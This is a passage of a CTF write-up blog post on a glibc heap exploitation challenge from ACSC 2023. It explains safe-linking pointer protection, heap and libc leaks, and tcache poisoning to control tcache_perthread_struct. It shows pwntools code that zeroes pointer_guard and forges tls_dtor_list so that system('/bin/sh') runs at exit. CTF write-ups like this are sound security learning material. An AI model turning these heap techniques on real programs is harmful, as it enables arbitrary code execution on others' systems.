</span></span><span class=line><span class=cl>  <span class=n>tcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>e</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>++</span><span class=p>(</span><span class=n>tcache</span><span class=o>-&gt;</span><span class=n>counts</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Caller must ensure that we know tc_idx is valid and there&#39;s
</span></span></span><span class=line><span class=cl><span class=cm>   available chunks to remove.  */</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=n>__always_inline</span> <span class=kt>void</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=nf>tcache_get</span> <span class=p>(</span><span class=kt>size_t</span> <span class=n>tc_idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>tcache_entry</span> <span class=o>*</span><span class=n>e</span> <span class=o>=</span> <span class=n>tcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span> <span class=p>(</span><span class=o>!</span><span class=nf>aligned_OK</span> <span class=p>(</span><span class=n>e</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;malloc(): unaligned tcache chunk detected&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>tcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>]</span> <span class=o>=</span> <span class=nf>REVEAL_PTR</span> <span class=p>(</span><span class=n>e</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=o>--</span><span class=p>(</span><span class=n>tcache</span><span class=o>-&gt;</span><span class=n>counts</span><span class=p>[</span><span class=n>tc_idx</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=n>e</span><span class=o>-&gt;</span><span class=n>key</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>e</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Compare with <a href=https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2918 target=_blank rel="noopener noreffer">glibc-2.31&rsquo;s malloc</a>, we notice that tcache chunk&rsquo;s fd is encrypted and decrypted with <code>PROTECT_PTR()</code> and <code>REVEAL_PTR()</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c:malloc.c data-lang=c:malloc.c><span class=line><span class=cl><span class=cp>#define PROTECT_PTR(pos, ptr) \
</span></span></span><span class=line><span class=cl><span class=cp>  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
</span></span></span><span class=line><span class=cl><span class=cp>#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
</span></span></span></code></pre></td></tr></table></div></div><p>For example:</p><p>Instead of storing <code>tcache->entries[tc_idx]</code>, <code>tcache_put()</code> store</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(&amp;e-&gt;next&gt;&gt;12)^(tcache-&gt;entries[tc_idx])
</span></span></code></pre></td></tr></table></div></div><p><code>&amp;e->next>>12</code> is basically heap base, and <code>tcache->entries[tc_idx]</code> is equal to zero when the bin is empty (the first time a chunk is inserted into that bin).</p><p>So the expression is equal to <code>heap_base>>12</code>.</p><h2 id=leak-libc-base-and-control-tcache_perthread_struct>Leak libc base and control tcache_perthread_struct</h2><p>Now we have heap address.</p><blockquote><p>My first attempt during ctf is trying to insert a big chunk to unsorted bin and leak libc base. But even when I do the former, it used up 9 slot of notes and I couldn&rsquo;t perform another tcache poisoning to point to the big chunk and leak libc base.</p></blockquote><p>After reading nyancat&rsquo;s writeup, I notice the existence of <code>tcache_perthread_struct</code> which is the first chunk to be allocated on heap. If we could control the tcache struct, we could perform a lot of magic.</p><p>First prepare tcache poisoning for 2 bins to allocate at <code>tcache_perthread_struct</code>. Note that we overwrite fd with <code>PROTECT_PTR(tcache_perthead_struct)</code> instead of the original pointer.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># tcache poisoning to alloc 2 chunks at tcache_perthead_struct</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>protect</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>protect</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><p>Then write 0x290 bin size to 7, free it to put it to unsorted bin (fastbin&rsquo;s max bin size is 0xa0) and leak libc base.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x200000000</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mh>0x27</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>list</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=tls_dtor_list>tls_dtor_list</h2><p>From glibc-2.32, <code>__malloc_hook</code> and <code>__free_hook</code> were removed so I used <code>tls_dtor_list</code> to prepare a function call when program <code>exit()</code>.</p><p><code>exit()</code> is actually a wrapper of <code>__run_exit_handlers()</code>. That function will call <code>__call_tls_dtors()</code> if <code>tls_dtor_list</code> is not NULL.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>__run_exit_handlers</span> <span class=p>(</span><span class=kt>int</span> <span class=n>status</span><span class=p>,</span> <span class=k>struct</span> <span class=n>exit_function_list</span> <span class=o>**</span><span class=n>listp</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		     <span class=kt>bool</span> <span class=n>run_list_atexit</span><span class=p>,</span> <span class=kt>bool</span> <span class=n>run_dtors</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* First, call the TLS destructors.  */</span>
</span></span><span class=line><span class=cl><span class=cp>#ifndef SHARED
</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=k>if</span> <span class=p>(</span><span class=o>&amp;</span><span class=n>__call_tls_dtors</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=k>if</span> <span class=p>(</span><span class=n>run_dtors</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nf>__call_tls_dtors</span> <span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=c1>//[truncated...]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>tls_dtor_list</code>&rsquo;s address can be calculated from libc base. We can prepare the pointer in tcache struct to arbitrarily and point it to a prepared <code>dtor_list</code>.</p><h2 id=pointer-mangling>Pointer mangling</h2><p>There&rsquo;s one thing to overcome that function pointer in <code>__call_tls_dtors()</code> is passed to <code>PTR_DEMANGLE()</code> before being called.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Call the destructors.  This is called either when a thread returns from the
</span></span></span><span class=line><span class=cl><span class=cm>   initial function or when the process exits via the exit function.  */</span>
</span></span><span class=line><span class=cl><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>__call_tls_dtors</span> <span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=n>tls_dtor_list</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>struct</span> <span class=n>dtor_list</span> <span class=o>*</span><span class=n>cur</span> <span class=o>=</span> <span class=n>tls_dtor_list</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>dtor_func</span> <span class=n>func</span> <span class=o>=</span> <span class=n>cur</span><span class=o>-&gt;</span><span class=n>func</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef PTR_DEMANGLE
</span></span></span><span class=line><span class=cl><span class=cp></span>      <span class=nf>PTR_DEMANGLE</span> <span class=p>(</span><span class=n>func</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>      <span class=n>tls_dtor_list</span> <span class=o>=</span> <span class=n>tls_dtor_list</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nf>func</span> <span class=p>(</span><span class=n>cur</span><span class=o>-&gt;</span><span class=n>obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=cm>/* Ensure that the MAP dereference happens before
</span></span></span><span class=line><span class=cl><span class=cm>	 l_tls_dtor_count decrement.  That way, we protect this access from a
</span></span></span><span class=line><span class=cl><span class=cm>	 potential DSO unload in _dl_close_worker, which happens when
</span></span></span><span class=line><span class=cl><span class=cm>	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span>
</span></span><span class=line><span class=cl>      <span class=nf>atomic_fetch_add_release</span> <span class=p>(</span><span class=o>&amp;</span><span class=n>cur</span><span class=o>-&gt;</span><span class=n>map</span><span class=o>-&gt;</span><span class=n>l_tls_dtor_count</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>free</span> <span class=p>(</span><span class=n>cur</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>PTR_MANGLE()</code> works by XORing the pointer with a 64bit secret thread data (<code>fs:0x30</code>), then performing a bitwise left rotation of 0x11 bits (on x86-64). <code>PTR_DEMANGLE()</code> is the reverse.</p><p>That secret value is store in Thread Local Storage (namely <code>pointer_guard</code>, below <code>canary</code>) and its address can be calculated from libc base too. If you can overwrite the pointer guard value to 0, so the mangle will be just ROL(0x11)</p><p>Therefore, we control <code>tcache_perthread_struct</code> to point entries of 2 sizes to <code>tls_dtor_list</code> and <code>pointer_guard</code> to bypass <code>PTR_DEMANGLE()</code> and point <code>tls_dtor_list</code> to a crafted <code>dtor_list</code> with function attribute can be <code>system</code> or <code>execve</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=n>p16</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=mh>0x70</span><span class=o>//</span><span class=mi>2</span><span class=p>))</span>     <span class=c1># overwrite tcache-&gt;counts</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>tls_dtor_list</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pointer_guard</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rol</span><span class=p>(</span><span class=n>lib</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>],</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mi>64</span><span class=p>))</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>binsh</span><span class=p>))</span>    <span class=c1># overwrite tcache-&gt;entries</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>   <span class=c1># overwrite pointer_guard</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_dtor_list</span><span class=p>))</span>  <span class=c1># point to fake dtor_list </span>
</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-02-28</span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/acsc-2023-writeup/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://slaydarkkkk.github.io/acsc-2023-writeup/ data-title="ACSC 2023 re(pwn) writeup" data-hashtags="pwn,heap,tcache struct tampering,exit handler tampering"><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://slaydarkkkk.github.io/acsc-2023-writeup/ data-hashtag=pwn><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://slaydarkkkk.github.io/acsc-2023-writeup/ data-title="ACSC 2023 re(pwn) writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://slaydarkkkk.github.io/acsc-2023-writeup/ data-title="ACSC 2023 re(pwn) writeup"><i data-svg-src=/lib/simple-icons/icons/line.min.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://slaydarkkkk.github.io/acsc-2023-writeup/ data-title="ACSC 2023 re(pwn) writeup"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/pwn/>pwn</a>,&nbsp;<a href=/tags/heap/>heap</a>,&nbsp;<a href=/tags/tcache-struct-tampering/>tcache struct tampering</a>,&nbsp;<a href=/tags/exit-handler-tampering/>exit handler tampering</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.117.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2019 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>sl4yd4rk</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/contrib/auto-render.min.js></script><script type=text/javascript src=/lib/katex/contrib/copy-tex.min.js></script><script type=text/javascript src=/lib/katex/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>